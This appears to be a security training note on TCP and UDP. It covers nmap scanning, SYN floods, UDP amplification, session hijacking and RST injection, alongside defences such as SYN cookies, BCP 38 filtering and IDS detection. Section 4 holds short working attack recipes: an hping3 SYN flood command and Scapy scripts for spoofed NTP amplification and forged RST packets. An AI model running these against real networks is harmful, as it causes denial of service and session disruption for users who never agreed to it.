# TCP and UDP

## 1. Overview

TCP (Transmission Control Protocol, RFC 9293) and UDP (User Datagram Protocol, RFC 768) are the two transport-layer protocols of the IP suite. TCP is connection-oriented, reliable, ordered, and flow-controlled; UDP is connectionless, unreliable, and has no ordering or flow control.

Both protocols expose a large attack surface: port scanning relies on TCP/UDP semantics; SYN floods and UDP amplification abuse the handshake and the lack of connection state; TCP session hijacking abuses sequence-number predictability and unauthenticated state. This file covers the mechanics, the offensive techniques, and the defensive controls.

## 2. Reconnaissance / Enumeration

### TCP scanning

- `nmap -sS 10.10.10.10` - SYN scan (half-open); fast and stealthy, requires root.
- `nmap -sT 10.10.10.10` - full TCP connect scan; works without root, logged by the target application.
- `nmap -sA 10.10.10.10` - ACK scan; maps firewall rules rather than open ports.
- `nmap -sN -sF -sX 10.10.10.10` - NULL, FIN, Xmas scans; rely on RFC-noncompliant stacks.

### UDP scanning

- `nmap -sU --top-ports 100 10.10.10.10` - UDP scan of the most common ports; slow, because open|filtered is ambiguous.
- `nmap -sU -p 53,123,161 10.10.10.10` - targeted UDP scan for DNS, NTP, SNMP.

### Service and version detection

- `nmap -sV -p 22,80,443 10.10.10.10` - banner grab and version detection.
- `nmap -sC -p 22,80,443 10.10.10.10` - run the default NSE scripts against open ports.

## 3. Common Attack Vectors

### SYN flood

The attacker sends many SYN packets with spoofed source addresses; the server allocates a half-open connection for each and exhausts its backlog. The result is a denial of service for legitimate clients.

### UDP amplification

Protocols that reply with more data than the request (DNS, NTP monlist, SNMP, memcached) can be abused with a spoofed source IP to amplify traffic toward the victim.

### TCP session hijacking

If an attacker can predict or observe the TCP sequence numbers of an established session, they can inject data into it. On-path attackers see the sequence numbers directly; off-path attackers need to guess them (hard on modern stacks with randomized ISN).

### RST injection

An on-path attacker can send a forged RST to tear down a TCP connection, causing a denial of service.

### UDP spoofing

Because UDP has no handshake, any host can send datagrams with a forged source IP. This is the basis of UDP amplification and of many reflection attacks.

## 4. Exploitation Recipes

### SYN flood with hping3

```bash
sudo hping3 -S --flood -V -p 80 10.10.10.50
```

`-S` sets the SYN flag, `--flood` sends as fast as possible, `-p 80` targets port 80. The target's SYN backlog fills and legitimate connections are refused.

### UDP amplification with Scapy (lab)

```python
from scapy.all import *
target = "10.10.10.50"
for _ in range(1000):
    send(IP(src="10.10.10.50", dst="10.10.10.1")/UDP(sport=RandShort(), dport=123)/b"\x17\x00\x03\x2a" + b"\x00"*4)
```

This sends NTP mode 7 monlist requests with a spoofed source. On a vulnerable NTP server, each request returns a large list, amplifying traffic toward the victim. Modern NTP servers disable monlist; this is a historical technique.

### TCP RST injection with Scapy (on-path, lab)

```python
from scapy.all import *
# Requires the current sequence number of the session
send(IP(src="10.10.10.1", dst="10.10.10.50")/TCP(sport=80, dport=54321, flags="R", seq=123456789))
```

The exact sequence number must match the receiver's expected value; on-path tools like `tcpkill` (dsniff) compute it automatically.

## 5. Post-Exploitation

After a transport-layer attack succeeds, the attacker can:

- Deny service to legitimate users (SYN flood, UDP amplification).
- Tear down security sessions (RST injection) to force re-authentication through a hostile portal.
- Hijack an authenticated session (TCP session hijacking) if the sequence numbers are observable.

## 6. Preventive Controls

- **SYN cookies** on the server: `net.ipv4.tcp_syncookies=1`. The server does not allocate state until the handshake completes.
- **Rate-limit SYN** per source: `iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT`.
- **BCP 38 ingress filtering**: drop packets with a source IP that does not belong to the sending network. This is the primary defense against spoofed-source amplification.
- **Disable UDP amplification services**: NTP monlist, open DNS resolvers, SNMP public community.
- **Randomized TCP ISN** (default on modern stacks) makes off-path session hijacking impractical.
- **TLS / IPsec** to prevent on-path RST injection and session hijacking.

## 7. Detection Controls

- **Zeek** `conn` log: SYN floods appear as many incomplete connections from one source.
- **NetFlow**: a spike in outbound UDP to a single destination is an amplification signal.
- **IDS rules**: alert on UDP responses much larger than requests; on TCP RST from a non-peer; on SYN rate per source.
- **SYN backlog monitoring**: `netstat -s | grep -i listen` on Linux, `show tcp brief` on Cisco.

## 8. Verification

- On the server: `sysctl net.ipv4.tcp_syncookies` should be `1`.
- On the border router: `show ip verify source` (Cisco) confirms BCP 38 filtering.
- Test SYN cookies: run a SYN flood in a lab; the server should stay responsive.
- Test amplification defense: query an open resolver from outside; it should refuse recursion.

## 9. Case Studies

- **Mirai botnet (2016)**: used UDP and TCP floods (including SYN floods) from compromised IoT devices to take down DNS provider Dyn. The lesson: transport-layer floods are commodity attacks; BCP 38 and rate limiting are baseline.
- **memcached amplification (2018)**: UDP port 11211 with a spoofed source amplified traffic by up to 51,000x. The lesson: any UDP service that replies with more data than the request is an amplifier.

## 10. Legal and Ethical Notes

SYN floods, UDP amplification, session hijacking, and RST injection on a network you do not own or have explicit written authorization to test are illegal in most jurisdictions. In a penetration test, transport-layer attacks must be listed in the scope and rules of engagement. On shared infrastructure, even a port scan may violate terms of service.

## 11. References

- RFC 9293 (TCP) - https://www.rfc-editor.org/rfc/rfc9293
- RFC 768 (UDP) - https://www.rfc-editor.org/rfc/rfc768
- RFC 2827 / BCP 38 (Network Ingress Filtering) - https://www.rfc-editor.org/rfc/rfc2827
- hping3 man page - https://linux.die.net/man/8/hping3
- Scapy documentation - https://scapy.readthedocs.io/en/latest/
- Zeek conn log - https://docs.zeek.org/en/master/scripts/base/protocols/conn/main.zeek.html
- Cisco BCP 38 / uRPF - https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/sec_data_acl/configuration/15-mt/sec-data-acl-15-mt-book/sec-ip-acl-urf.html

## Certification Alignment

- CompTIA Network+ (N10-009): Objective 1.4 (topologies), Objective 3.2 (attacks), Objective 5.3 (troubleshooting)
- Cisco CCNA (200-301): 4.1 (Layer 2 security), 5.5 (security concepts), 1.6 (troubleshooting)
